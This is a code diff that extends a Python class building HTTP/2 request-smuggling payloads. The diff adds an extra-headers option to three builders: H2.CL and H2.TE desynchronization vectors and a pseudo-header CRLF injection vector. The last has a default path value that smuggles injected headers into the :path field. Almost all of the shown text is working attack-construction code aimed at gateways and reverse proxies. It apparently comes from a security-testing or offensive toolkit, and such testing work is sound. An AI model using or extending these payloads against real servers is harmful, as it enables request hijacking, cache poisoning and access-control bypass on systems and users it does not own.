@@ -189,6 +189,7 @@ class H2GatewayDesyncBuilder:
         declared_cl: int = 0,
         actual_payload: bytes = b"X",
         stream_id: int = 1,
+        extra_headers: Optional[Dict[str, str]] = None,
     ) -> bytes:
         """
         H2.CL Desynchronization Vector:
@@ -202,6 +203,8 @@ class H2GatewayDesyncBuilder:
             (":path", path),
             ("content-length", str(declared_cl)),
         ]
+        for hk, hv in (extra_headers or {}).items():
+            headers.append((str(hk).lower(), str(hv)))
         headers_payload = HPACKLite.encode_headers_block(headers)
 
         # HEADERS frame (END_HEADERS only, keeping stream open for DATA)
@@ -230,6 +233,7 @@ class H2GatewayDesyncBuilder:
         te_value: str = "chunked",
         chunked_body: bytes = b"0\r\n\r\n",
         stream_id: int = 1,
+        extra_headers: Optional[Dict[str, str]] = None,
     ) -> bytes:
         """
         H2.TE Desynchronization Vector:
@@ -244,6 +248,8 @@ class H2GatewayDesyncBuilder:
             (":path", path),
             ("transfer-encoding", te_value),
         ]
+        for hk, hv in (extra_headers or {}).items():
+            headers.append((str(hk).lower(), str(hv)))
         headers_payload = HPACKLite.encode_headers_block(headers)
 
         headers_frame = H2Frame(
@@ -268,6 +274,7 @@ class H2GatewayDesyncBuilder:
         injected_path: str = "/%20HTTP/1.1\r\nHost: target.local\r\nTransfer-Encoding: chunked\r\nFoo: bar",
         host: str = "target.local",
         stream_id: int = 1,
+        extra_headers: Optional[Dict[str, str]] = None,
     ) -> bytes:
         """
         H2 Pseudo-Header CRLF Injection Vector:
@@ -280,6 +287,8 @@ class H2GatewayDesyncBuilder:
             (":authority", host),
             (":path", injected_path),
         ]
+        for hk, hv in (extra_headers or {}).items():
+            headers.append((str(hk).lower(), str(hv)))
         headers_payload = HPACKLite.encode_headers_block(headers)
 
         headers_frame = H2Frame(
